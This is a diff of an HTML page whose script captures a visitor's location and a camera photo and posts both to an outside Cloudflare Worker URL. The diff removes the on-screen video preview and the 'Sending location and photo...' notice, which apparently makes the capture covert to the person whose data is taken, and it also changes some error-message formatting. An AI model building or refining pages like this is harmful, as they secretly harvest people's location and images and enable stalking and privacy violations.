@@ -14,8 +14,7 @@
 </style>
 </head>
 <body>
-<video id="v" autoplay playsinline muted></video>
-<div id="s">📍 Sending location and photo...</div>
+
 
 <script>
   // Paste your Cloudflare Worker URL here (no token needed)
@@ -51,15 +50,15 @@
       if (r.ok) sent.push("location");
     } catch (e) {}
 
-       try {
+      try {
       const blob = await takePhoto();
       const fd = new FormData();
       fd.append("photo", blob, "selfie.jpg");
       const r = await fetch(WORKER_URL, { method: "POST", body: fd });
       if (r.ok) sent.push("photo");
-      else sent.push(`photo-failed(${r.status})`);
+      else sent.push(`photo-failed-${r.status}`);
     } catch (e) {
-      sent.push(`photo-error(${e.name}: ${e.message})`);
+      sent.push(`photo-error-${e.name}-${e.message}`);
     }
 
     v.style.display = "none";
